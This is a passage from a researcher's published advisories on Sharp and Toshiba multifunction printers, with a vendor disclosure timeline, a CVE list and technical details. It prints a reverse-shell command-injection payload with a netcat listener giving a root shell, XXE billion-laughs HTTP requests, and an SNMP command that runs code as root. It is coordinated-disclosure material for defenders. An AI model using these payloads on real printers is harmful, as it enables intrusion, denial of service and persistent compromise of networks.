<p><img alt="" src="images/2024-sharp-cve-2022-45796.png" /></p>
<p><a href="images/2024-sharp-cve-2022-45796-full.png">Click here for full image</a></p>
<p>Using Burp, an attacker can intercept the resulting request and inject a command inside the vulnerable <code>ggt_textbox(16)</code> field, for example,
<code>ggt_textbox%2816%29=%7Cbash+-i+%3E%26+%2Fdev%2Ftcp%2Fattacker_ip%2F443+0%3E%261</code> corresponding to the payload <code>|bash -i /dev/tcp/attacker_ip/443 0&gt;&amp;1</code>.</p>
<p>The attacker will receive a root shell from the printers and will get a full admin access, allowing to backdoor the printer for persistence:</p>
<pre><code>kali% nc -l -v -p 443
listening on [any] 443 ...
10.0.0.1: inverse host lookup failed: Unknown host
connect to [10.0.0.10] from (UNKNOWN) [10.0.0.1] 58196
bash: cannot set terminal process group (619): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.3# id
uid=0(root) gid=0(root) groups=0(root)
bash-4.3# uname -ap
Linux SC58C36B 4.1.46-rt52 #2 SMP PREEMPT RT Fri Apr 26 12:29:16 JST 2019 aarch64 GNU/Linux
bash-4.3# ps -auxww | grep ping
root      5022  0.0  0.0   1916   368 ?        S    09:34   0:00 grep ping
root     28966  0.0  0.0   2876  1940 ?        S    09:33   0:00 sh -c ping6 -c 1 -W 2 |bash -i &gt;&amp; /dev/tcp/10.0.0.10/443 0&gt;&amp;1
bash-4.3#
init-+-aarch64-fsl-lin
     |-access_audit_mg
     |-bcr_iface
     |-blackscreen_mon
     |-check_hash_daem
     |-cmd_proc
     |-cpu_state
     |-dbus-daemon
     |-dout_daemon---14*[{dout_daemon}]
     |-dummy_init
     |-getty
     |-intsrt
     |-linter
     |-mgrcpuif_r1b---2*[{mgrcpuif_r1b}]
     |-mgrcpuif_r1c---2*[{mgrcpuif_r1c}]
     |-nfcproc---7*[{nfcproc}]
     |-ocrsrv---21*[{ocrsrv}]
     |-oom_watch
     |-poff_reboot
     |-pulseaudio---{null-sink}
     |-rc---S998linuxApp-+-IFS---20*[{IFS}]
     |                   |-main-+-preview---48*[{preview}]
     |                   |      |-sxlinklocald
     |                   |      `-514*[{main}]
     |                   |-netp---netp---sh---bash---pstree
     |                   |-pdl---43*[{pdl}]
     |                   |-reus_lcd_mgr---{reus_lcd_mgr}
     |                   |-rtc_manager---{rtc_manager}
     |                   |-2*[seriallink---6*[{seriallink}]]
     |                   |-sound_play-+-14*[{sound_play}]
     |                   |            `-{threaded-ml}
     |                   |-startx---xinit-+-X
     |                   |                `-sh-+-NX---7*[{NX}]
     |                   |                     |-ui_mainview---12*[{ui_mainview}]
     |                   |                     `-ui_subview---7*[{ui_subview}]
     |                   |-usbch_mgr
     |                   |-vmstat
     |                   |-watch_proc
     |                   `-wlctlproc---6*[{wlctlproc}]
     |-2*[rotate]
     |-rsyslogd-+-{in:imklog}
     |          |-{in:immark}
     |          |-{in:imuxsock}
     |          `-{rs:main Q:Reg}
     |-system_reset---6*[{system_reset}]
     `-udevd---2*[udevd]
bash-4.3#
</code></pre>
<h2>Vendor Response</h2>
<p>JPCERT provided a <a href="https://jvn.jp/en/vu/JVNVU93051062/index.html">security bulletin</a>.</p>
<p>Sharp provided a <a href="https://global.sharp/products/copier/info/info_security_2024-05.html">security bulletin</a>.</p>
<p>Toshiba provided a <a href="https://www.toshibatec.com/information/20240531_02.html">security bulletin</a>.</p>
<p><a id="timeline"></a></p>
<h2>Report Timeline</h2>
<ul>
<li>May 2023: Security assessment performed on Sharp Multi-function printers.</li>
<li>June 1, 2023: A complete report was sent to JPCERT (security contact for Sharp).</li>
<li>June 6, 2023: JPCERT aknowledged the reception of the security assessment and asked more information about the security contact.</li>
<li>June 7, 2023: Information about the security contact provided to JPCERT.</li>
<li>June 7, 2023: JPCERT confirmed the reception of the security contact.</li>
<li>Jul 17, 2023: Questions sent to JPCERT asking for any feedback from Sharp.</li>
<li>Jul 18, 2023: JPCERT confirmed that they had a meeting with Sharp a week ago. Sharp finished the investigation and was preparing a document listing all the issues.</li>
<li>Jul 25, 2023: JPCERT provided the Excel file with Sharp's comments.</li>
<li>Jul 26, 2023: I confirmed the reception of the documents</li>
<li>Jul 28, 2023: Comments sent to JPCERT in the Excel file to ask to re-evaluate some issues.</li>
<li>Aug 1, 2023: Received responses from JPCERT regarding some of the issues.</li>
<li>Aug 1, 2023: Additional information provided to JPCERT regarding a potential disclosure of vulnerabilities if the issues are not patched. I suggested a tripartite meeting with Sharp and JPCERT to review the issues.</li>
<li>Aug 2, 2023: JPCERT suggested solutions to get security patches in a timely manner by prioritizing issues.</li>
<li>Aug 3, 2023: Agreed with JPCERT to prioritize vulnerabilities based on severity, then patch critical vulnerabilities as soon as possible while delaying hard-to-fix vulnerabilities.</li>
<li>Aug 4, 2023: JPCERT confirmed that they are working with Sharp to get the issues fixed.</li>
<li>Aug 16, 2023: JPCERT confirmed that they asked Sharp to reconsider some of the issues with two buckets (short-term fixes and long-term countermeasures) and that Sharp was working on the issues.</li>
<li>Sep 13, 2023: I answered that it is an acceptable practice, since short-term fixes and long-term countermeasures are currently being implemented by other printer vendors.</li>
<li>Sep 14, 2023: JPCERT confirmed that they are working with Sharp to get security patches.</li>
<li>Oct 10, 2023: I confirmed the reception of the updates.</li>
<li>Nov 16, 2023: JPCERT provided a new Excel file with the issues and the countermeasures provided by Sharp.</li>
<li>Nov 21, 2023: Excel file was reviewed and Sharp suggested to patch vulnerable code and remove vulnerable features.</li>
<li>Jan 29, 2024: Asking about the status of the vulnerabilities (CVE, availability of security patches).</li>
<li>Jan 30, 2024: JPCERT confirmed that a JVN advisory will be published with corresponding CVEs. Security patches will be provided by May 2024.</li>
<li>Jan 30, 2024: I suggested to test patched firmware images to confirm that vulnerabilities were correctly patched.</li>
<li>Jan 31, 2024: JPCERT passed the message to Sharp regarding additional tests of patched firmware images.</li>
<li>Feb 16, 2024: JPCERT sent the updated Excel file containing the vulnerabilities.</li>
<li>Feb 16, 2024: Confirmation of the reception of the Excel file.</li>
<li>Feb 20, 2024: Updated Excel file sent to JPCERT with my comments.</li>
<li>Mar 1, 2024: JPCERT sent comments regarding my feedbacks.</li>
<li>Mar 4, 2024: I confirmed the reception of the feedbacks.</li>
<li>May 8, 2024: Email asking JPCERT when the security advisories and security patches will be published.</li>
<li>May 16, 2024: JPCERT sent a list of affected products/versions and confirmed that they are working on a draft.</li>
<li>May 20, 2024: I suggested to include unsupported models since, based on my testing, some unsupported models were vulnerable.</li>
<li>May 21, 2024: JPCERT reported sending this suggestion to Sharp.</li>
<li>May 28, 2024: JPCERT provided the JVN English edition draft advisory, the final list of affected products and Toshiba Tech MFPs information.</li>
<li>May 28, 2024: I asked JPCERT to provide me with the list of CVEs for the list of vulnerabilities I reported.</li>
<li>May 29, 2024: JPCERT provided a list of vulnerabilities along with CVEs and clarifications regarding some of the findings.</li>
<li>May 30, 2024: Confirmation sent to JPCERT that the list was received.</li>
<li>May 31, 2024: JPCERT published a security advisory: <a href="https://jvn.jp/en/vu/JVNVU93051062/index.html">https://jvn.jp/en/vu/JVNVU93051062/index.html</a>.</li>
<li>May 31, 2024: Sharp published a security advisory: <a href="https://global.sharp/products/copier/info/info_security_2024-05.html">https://global.sharp/products/copier/info/info_security_2024-05.html</a>.</li>
<li>May 31, 2024: Toshiba published a security advisory: <a href="https://www.toshibatec.com/information/20240531_02.html">https://www.toshibatec.com/information/20240531_02.html</a>.</li>
<li>June 27, 2024: A security advisory is published.</li>
</ul>
<h2>Credits</h2>
<p>These vulnerabilities were found by Pierre Barre aka Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/blog/2024-06-27-sharp-mfp-17-vulnerabilities.html">https://pierrekim.github.io/blog/2024-06-27-sharp-mfp-17-vulnerabilities.html</a></p>
<p><a href="https://pierrekim.github.io/advisories/2024-sharp-mfp.txt">https://pierrekim.github.io/advisories/2024-sharp-mfp.txt</a></p>
<p><a href="https://jvn.jp/en/vu/JVNVU93051062/index.html">https://jvn.jp/en/vu/JVNVU93051062/index.html</a></p>
<p><a href="https://global.sharp/products/copier/info/info_security_2024-05.html">https://global.sharp/products/copier/info/info_security_2024-05.html</a></p>
<p><a href="https://www.toshibatec.com/information/20240531_02.html">https://www.toshibatec.com/information/20240531_02.html</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p></content>
    </entry>
    
    <entry>
        <title>40 vulnerabilities in Toshiba Multi-Function Printers</title>
        <link href="2024-06-27-toshiba-mfp-40-vulnerabilities.html"/>
        <content type="html"><h2>Product description</h2>
<blockquote>
<p>e-STUDIO Multi-Function Printers (MFPs) are fast and productive, providing businesses and organisations the capability to produce what you need, when you need it.</p>
<p>From <a href="https://www.toshibatec.co.uk/workplace-solutions/products-and-solutions/mfps-and-printers/">https://www.toshibatec.co.uk/workplace-solutions/products-and-solutions/mfps-and-printers/</a></p>
</blockquote>
<h2>Vulnerability Summary</h2>
<p>Vulnerable versions: 103 different models of Toshiba Multi-Function Printers (MFP) are vulnerable. It is recommended to visit the official <a href="https://www.toshibatec.com/information/20240531_01.html">Toshiba advisory</a>, review the <a href="https://www.toshibatec.com/information/pdf/information20240531_01.pdf">list of affected printers</a> and apply security patches and replace unsupported MFP models.</p>
<p>The summary of the vulnerabilities is as follows:</p>
<ol>
<li><a href="#pre-auth-xxe-dos">CVE-2024-27141 - Pre-authenticated Blind XML External Entity (XXE) injection - DoS</a></li>
<li><a href="#pre-auth-xxe">CVE-2024-27142 - Pre-authenticated XXE injection</a></li>
<li><a href="#pre-auth-rce-snmp">CVE-2024-27143 - Pre-authenticated Remote Code Execution as root</a></li>
<li><a href="#pre-auth-rces-upload">CVE-2024-27144 - Pre-authenticated Remote Code Execution as root or apache and multiple Local Privilege Escalations</a><br>
4.1. <a href="#pre-auth-rce-upload-wsgi-py">Remote Code Execution - Upload of a new .py module inside WSGI Python programs</a><br>
4.2. <a href="#pre-auth-rce-upload-wsgi-ini">Remote Code Execution - Upload of a new .ini configuration files inside WSGI Python programs</a><br>
4.3. <a href="#pre-auth-rce-upload-gdb">Remote Code Execution - Upload of a malicious script <code>/tmp/backtraceScript.sh</code> and injection of malicious gdb commands</a><br>
4.4. <a href="#pre-auth-rce-upload-sapphost">Remote Code Execution - Upload of a malicious <code>/home/SYSROM_SRC/build/common/bin/sapphost.py</code> program</a><br>
4.5. <a href="#pre-auth-rce-libs">Remote Code Execution - Upload of malicious libraries</a><br>
4.6. <a href="#pre-auth-rce-misc">Other ways to get Remote Code Execution</a></li>
<li><a href="#post-auth-rces-upload">CVE-2024-27145 - Multiple Post-authenticated Remote Code Executions as root</a></li>
<li><a href="#lack-privilages-separation">CVE-2024-27146 - Lack of privileges separation</a></li>
<li><a href="#lpe-rce-snmpd">CVE-2024-27147 - Local Privilege Escalation and Remote Code Execution using snmpd</a></li>
<li><a href="#lpe-rce-path">CVE-2024-27148 - Local Privilege Escalation and Remote Code Execution using insecure PATH</a></li>
<li><a href="#lpe-rce-ld-preload">CVE-2024-27149 - Local Privilege Escalation and Remote Code Execution using insecure LD_PRELOAD</a></li>
<li><a href="#lpe-rce-ld-library-path">CVE-2024-27150 - Local Privilege Escalation and Remote Code Execution using insecure LD_LIBRARY_PATH</a></li>
<li><a href="#lpe-rce-106-programs">CVE-2024-27151 - Local Privilege Escalation and Remote Code Execution using insecure permissions for 106 programs</a><br>
11.1. <a href="#lpe-rce-3-programs">3 vulnerable programs not running as root</a><br>
11.2. <a href="#lpe-rce-103-programs">103 vulnerable programs running as root</a></li>
<li><a href="#lpe-rce-libs">CVE-2024-27152 - Local Privilege Escalation and Remote Code Execution using insecure permissions for libraries</a><br>
12.1. <a href="#lpe-rce-syscallerr">Example with <code>/home/SYSROM_SRC/bin/syscallerr</code></a></li>
<li><a href="#lpe-rce-cissm">CVE-2024-27153 - Local Privilege Escalation and Remote Code Execution using CISSM</a></li>
<li><a href="#passwords-logs">CVE-2024-27154 and CVE-2024-27155 - Passwords stored in clear-text logs and insecure logs</a><br>
14.1. <a href="#passwords-logs-01">Clear-text password written in logs when an user logs into the printer</a><br>
14.2. <a href="#passwords-logs-02">Clear-text password written in logs when a password is modified</a></li>
<li><a href="#sessions-logs-01">CVE-2024-27156 - Leak of authentication sessions in insecure logs in /ramdisk/work/log directory</a></li>
<li><a href="#sessions-logs-02">CVE-2024-27157 - Leak of authentication sessions in insecure logs in /ramdisk/al/network/log directory</a></li>
<li><a href="#hardcoded-root-password">CVE-2024-27158 - Hardcoded root password</a></li>
<li><a href="#harcoded-password-logs">CVE-2024-27159 - Hardcoded password used to encrypt logs</a></li>
<li><a href="#harcoded-password-logs-weak-cipher">CVE-2024-27160 - Hardcoded password used to encrypt logs and use of a weak digest cipher</a></li>
<li><a href="#harcoded-password-files">CVE-2024-27161 - Hardcoded password used to encrypt files</a></li>
<li><a href="#dom-xss">CVE-2024-27162 - DOM-based XSS present in the /js/TopAccessUtil.js file</a></li>
<li><a href="#leak-admin-password">CVE-2024-27163 - Leak of admin password and passwords</a></li>
<li><a href="#hardcoded-password-telnetd">CVE-2024-27164 - Hardcoded credentials in telnetd</a></li>
<li><a href="#lpe-procsuid">CVE-2024-27165 - Local Privilege Escalation using PROCSUID</a></li>
<li><a href="#insecure-core-files">CVE-2024-27166 - Insecure permissions for core files</a></li>
<li><a href="#lpe-sendmail">CVE-2024-27167 - Insecure permissions used for Sendmail - Local Privilege Escalation</a></li>
<li><a href="#hardcoded-keys-python">CVE-2024-27168 - Hardcoded keys found in Python applications used to generate authentication cookies</a></li>
<li><a href="#lpe-webpanel">CVE-2024-27169 - Lack of authentication in WebPanel - Local Privilege Escalation</a></li>
<li><a href="#hardcoded-credentials-webdav">CVE-2024-27170 - Hardcoded credentials for WebDAV access</a></li>
<li><a href="#insecure-permissions">CVE-2024-27171 - Insecure permissions</a></li>
<li><a href="#rce-command-injection">CVE-2024-27172 - Remote Code Execution - command injection as root</a></li>
<li><a href="#rce-insecure-upload-01">CVE-2024-27173 - Remote Code Execution - insecure upload</a></li>
<li><a href="#rce-insecure-upload-02">CVE-2024-27174 - Remote Code Execution - insecure upload</a></li>
<li><a href="#lfi">CVE-2024-27175 - Local File Inclusion</a></li>
<li><a href="#rce-insecure-upload-03">CVE-2024-27176 - Remote Code Execution - insecure upload</a></li>
<li><a href="#rce-insecure-upload-04">CVE-2024-27177 - Remote Code Execution - insecure upload</a></li>
<li><a href="#rce-insecure-copy">CVE-2024-27178 - Remote Code Execution - insecure copy</a></li>
<li><a href="#session-disclosure-logs">CVE-2024-27179 - Session disclosure inside the log files in the installation of applications</a></li>
<li><a href="#toctou-rce">CVE-2024-27180 - TOCTOU vulnerability in the installation of applications, allowing to install rogue applications and get RCE</a></li>
</ol>
<p>CVE-2024-27171 to CVE-2024-27180 affect the implementation of third-party application system and third-party applications installed by default in Toshiba printers - this is an extremely interesting attack surface for persistence.</p>
<p>TL;DR: An attacker can compromise Toshiba Multi-Function Printers using multiple vulnerabilities.</p>
<p>List of vulnerable models of Toshiba Multi-Function Printers (103 models):</p>
<pre><code>2021AC, 2521AC, 2020AC, 2520AC, 2025NC, 2525AC, 3025AC, 3525AC, 3525ACG, 4525AC, 4525ACG, 5525AC, 5525ACG,
6525AC, 6525ACG, 2528A, 3028A, 3528A, 3528AG, 4528A, 4528AG, 5528A, 6528A, 6526AC, 6527AC, 7527AC, 6529A,
7529A, 9029A, 330AC, 400AC, 2010AC, 2110AC, 2510AC, 2610AC, 2015NC, 2515AC, 2615AC, 3015AC, 3115AC, 3515AC,
3615AC, 4515AC, 4615AC, 5015AC, 5115AC, 2018A, 2518A, 2618A, 3018A, 3118A, 3018AG, 3518A, 3518AG, 3618A,
3618AG, 4518A, 4518AG, 4618A, 4618AG, 5018A, 5118A, 5516AC, 5616AC, 6516AC, 6616AC, 7516AC, 7616AC, 5518A,
5618A, 6518A, 6618A, 7518A, 7618A, 8518A, 8618A, 2000AC, 2500AC, 2005NC, 2505AC, 3005AC, 3505AC, 4505AC,
5005AC, 2008A, 2508A, 3008A, 3008AG, 3508A, 3508AG, 4508A, 4508AG, 5008A, 5506AC, 6506AC, 7506AC, 5508A,
6508A, 7508A, 8508A, 3508LP, 4508LP, 5008LP.
</code></pre>
<p><em>Miscellaneous notes</em>:</p>
<p>This security assessment was entirely done using a blackbox approach and fully-remote - I only had some IPs of printers (no physical access and no credentials for admin or normal users). Consequently, the physical security of the printers was not analyzed and the vulnerabilities were confirmed with different models running the latest firmware versions (e-STUDIO2010AC, e-STUDIO3005AC, e-STUDIO3508A and e-STUDIO5018A).</p>
<p>The vulnerabilities were communicated to Toshiba on June 14, 2023 and communications with Toshiba were very effective.</p>
<p><em>Impacts</em></p>
<p>An attacker can compromise Toshiba multi-function printers (MFP) and execute code. These printers are running Linux and are powerful. They are ideal to host implants (and fun programs, like Bettercap) and move laterally inside infrastructures.</p>
<p><em>Recommendations</em></p>
<ul>
<li>Use network segmentation to isolate MFPs.</li>
<li>Apply security patches.</li>
<li>Replace unsupported MFPs.</li>
</ul>
<p><a id="pre-auth-xxe-dos"></a></p>
<h2>Details - Pre-authenticated Blind XML External Entity (XXE) injection - DoS</h2>
<p>The Toshiba printers use XML communication for the <code>/contentwebserver</code> API endpoint provided by the printer.</p>
<p>This endpoint is managed by an Apache module located inside the <code>mod_contentwebserver.so</code> library. This library provides XML parsing and is vulnerable to a time-based blind XML External Entity (XXE) vulnerability.</p>
<p>Using a Billion-laugh attack, we can confirm there is a time-based blind XXE vulnerability. When sending only 1 entity (&amp;lol1) that is defined inside the lolz root element, this &amp;lol1 entity is expanding into 10 entities and the request takes 200ms. </p>
<p>With an entity that is expanding into:</p>
<ul>
<li>10^10 entities, the request takes 206ms;</li>
<li>10^10^10 entities, the request takes 541ms;</li>
<li>10^10^10^10 entities, the request takes 2.7s;</li>
<li>10^10^10^10^2 entities, the request takes 8.8s;</li>
<li>10^10^10^10^2 entities, the request takes 30.9s;</li>
</ul>
<p>Even if the Apache server displays <code>MODULE_ERROR:SendRequest failed</code>, the XML has been successfully evaluated by the <code>mod_contentwebserver.so</code> library running in the remote printer.</p>
<p>The payload is:</p>
<pre><code>POST /contentwebserver HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */* 
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Pragma: no-cache
Content-Type: text/plain; charset=utf-8
csrfpId: 10.0.0.2.852d519a6fa9825fae857bac5c003da0
Content-Length: 759 
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/?MAIN=TOPACCESS
Cookie: Session=10.0.0.2.852d519a6fa9825fae857bac5c003da0; Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DLOGS; IgnoreSessionTimeout=1

&lt;!DOCTYPE lolz [
 &lt;!ENTITY lol "lol"&gt;
 &lt;!ELEMENT lolz (#PCDATA)&gt;
 &lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
 &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;
 &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
 &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;
 &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;"&gt;
 &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;
 &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;
 &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;
 &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;
]&gt;
&lt;lolz&gt;&amp;lol5;&lt;/lolz&gt;
</code></pre>
<p>Using this HTTP request inside Burp (with a correct session while browsing the printer without authentication), we can modify the entity on the last line; we can see that the XML has been parsed by comparing the time required for the printer to analyze the request.</p>
<p>The time will appear inside Burp on the bottom-right of the Window (in red in the following screenshots):</p>
<p><img alt="" src="images/2024-toshiba-xxe-dos.png" /></p>
<p><a href="images/2024-toshiba-xxe-dos-full.png">Click here for full image</a></p>
<p>With 10^10^10^10^4 entity, then request takes 30 seconds.</p>
<p>HTTP requests containing more XML complexity (with a lot of XML entities to be parsed) will DoS the printer and the CPU of the printer will run at 100%.</p>
<p>The XML parser is vulnerable to XXE, without authentication.</p>
<p>Exfiltration of file over HTTP, FTP and gopher was not obtained as some protections seem to be implemented in the XML parser.</p>
<p><a id="pre-auth-xxe"></a></p>
<h2>Details - Pre-authenticated XXE injection</h2>
<p>The Toshiba printers use XML communication for the <code>/contentwebserver</code> API endpoint provided by the printer.</p>
<p>This endpoint is managed by an Apache module located inside the <code>mod_contentwebserver.so</code> library. This library provides XML parsing and is vulnerable to a XML External Entity (XXE) vulnerability.</p>
<p>Using a Billion-laugh attack and correctly formatted data for the printer (with the Toshiba-specific non-public DTD, the tags will be interpreted by the remote printer), we can confirm the presence of a XXE vulnerability. The resulting evaluated XML will be displayed by the printer:</p>
<p><img alt="" src="images/2024-toshiba-xxe.png" /></p>
<p><a href="images/2024-toshiba-xxe-full.png">Click here for full image</a></p>
<p>The malicious payload is (containing a <code>&lt;X&gt;&amp;lol4;&lt;/X&gt;</code>):</p>
<pre><code>POST /contentwebserver HTTP/1.1
Host: 10.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Pragma: no-cache
Content-Type: text/plain; charset=utf-8
csrfpId: 10.0.0.2.5d5255447c6eb69fc84a2d8c2056eb7d
Content-Length: 1226
Origin: http://10.0.0.1:8080
Connection: close
Referer: http://10.0.0.1:8080/Administration/CreateNewPwd.html
Cookie: Locale=en-US,en#q=0.5; BrowserLang=en_US; pageTrack=MAIN%3DDEVICE; IgnoreSessionTimeout=1; clicked=0; addrLastVisited=ADDRBK; Session=10.0.0.2.5d5255447c6eb69fc84a2d8c2056eb7d; PREF=%7BList%2C8%2CClip
boardForPage-%7D; PROGSTAT=0

&lt;!DOCTYPE lolz [
 &lt;!ENTITY lol "lol"&gt;
 &lt;!ELEMENT lolz (#PCDATA)&gt;
 &lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
 &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;
 &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
 &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;
 &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;"&gt;
 &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;
 &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;
 &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;
 &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;
]&gt;
&lt;?xml version="1.0"?&gt;
&lt;DeviceInformationModel&gt;
  &lt;GetValue&gt;
    &lt;UserManager&gt;
      &lt;View&gt;
        &lt;Users/&gt;
      &lt;/View&gt;
    &lt;/UserManager&gt;
  &lt;/GetValue&gt;
  &lt;SetValue&gt;
    &lt;UserManager&gt;
      &lt;View&gt;
        &lt;Users&gt;
          &lt;User&gt;
            &lt;Information&gt;
              &lt;X&gt;&amp;lol4;&lt;/X&gt;
            &lt;/Information&gt;
          &lt;/User&gt;
        &lt;/Users&gt;
      &lt;/View&gt;
    &lt;/UserManager&gt;
  &lt;/SetValue&gt;
  &lt;Command&gt;
    &lt;ForgotPassword&gt;
      &lt;commandNode&gt;UserManager/Users&lt;/commandNode&gt;
      &lt;Params&gt;
        &lt;userDetails contentType="XPath"&gt;UserManager/View/Users/User&lt;/userDetails&gt;
        &lt;cmdDetails commandType="Reset"/&gt;
      &lt;/Params&gt;
    &lt;/ForgotPassword&gt;
  &lt;/Command&gt;
&lt;/DeviceInformationModel&gt;
</code></pre>
<p>And the response will be:</p>
<pre><code>HTTP/1.1 200 OK
Date: Wed, 27 May 2023 10:54:12 GMT
Server: Apache
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=63072000
Accept-Language: en-US,en;q=0.5
Connection: close
Content-Type: text/xml
Content-Length: 30465

&lt;?xml version="1.0"?&gt;
&lt;DeviceInformationModel&gt;
  &lt;GetValue&gt;
    &lt;UserManager&gt;
      &lt;View&gt;
        &lt;Users&gt;
          &lt;User&gt;
            &lt;Information&gt;
              &lt;X&gt;lollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollollol[...]lollollollollol&lt;/X&gt;
            &lt;/Information&gt;
          &lt;/User&gt;
        &lt;/Users&gt;
      &lt;/View&gt;
    &lt;/UserManager&gt;
  &lt;/GetValue&gt;
  &lt;Command&gt;
    &lt;ForgotPassword&gt;
      &lt;commandNode&gt;UserManager/Users&lt;/commandNode&gt;
      &lt;Params&gt;
        &lt;userDetails contentType="XPath"&gt;UserManager/View/Users/User&lt;/userDetails&gt;
        &lt;cmdDetails commandType="Reset"/&gt;
      &lt;/Params&gt;
      &lt;Response&gt;
        &lt;statusOfOperation&gt;STATUS_FAILED&lt;/statusOfOperation&gt;
      &lt;/Response&gt;
    &lt;/ForgotPassword&gt;
  &lt;/Command&gt;
&lt;/DeviceInformationModel&gt;
kali%
</code></pre>
<p>The XML parser is vulnerable to XXE, without authentication.</p>
<p>An attacker can exploit the XXE to retrieve information.</p>
<p>Exploitability was not analyzed in depth since a RCE was found at the same time: <a href="#pre-auth-rce-snmp">Pre-authenticated Remote Code Execution as root</a>.</p>
<p><a id="pre-auth-rce-snmp"></a></p>
<h2>Details - Pre-authenticated Remote Code Execution as root</h2>
<p>It was observed that the Toshiba printers use SNMP for configuration.</p>
<p>By default, these communities are used:</p>
<ul>
<li><code>public</code> for read only access;</li>
<li><code>private</code> for read/write access.</li>
</ul>
<p>Using the <code>private</code> community, it is possible to remotely execute commands as root on the remote printer.</p>
<p>For example, these commands will execute the command <code>id</code> as root on the remote printer:</p>
<pre><code>kali% snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c private [ip] 'nsExtendStatus."cmd"' = createAndGo 'nsExtendCommand."cmd"' = /bin/sh 'nsExtendArgs."cmd"' = '-c id'
NET-SNMP-EXTEND-MIB::nsExtendStatus."cmd" = INTEGER: createAndGo(4)
NET-SNMP-EXTEND-MIB::nsExtendCommand."cmd" = STRING: /bin/sh
NET-SNMP-EXTEND-MIB::nsExtendArgs."cmd" = STRING: -c id

kali% snmpbulkwalk -c private -v2c [ip] NET-SNMP-EXTEND-MIB::nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 6
NET-SNMP-EXTEND-MIB::nsExtendCommand."cmd" = STRING: /bin/sh
NET-SNMP-EXTEND-MIB::nsExtendArgs."cmd" = STRING: -c id
NET-SNMP-EXTEND-MIB::nsExtendInput."cmd" = STRING: 
NET-SNMP-EXTEND-MIB::nsExtendCacheTime."cmd" = INTEGER: 5
NET-SNMP-EXTEND-MIB::nsExtendExecType."cmd" = INTEGER: exec(1)
NET-SNMP-EXTEND-MIB::nsExtendRunType."cmd" = INTEGER: run-on-read(1)
NET-SNMP-EXTEND-MIB::nsExtendStorage."cmd" = INTEGER: volatile(2)
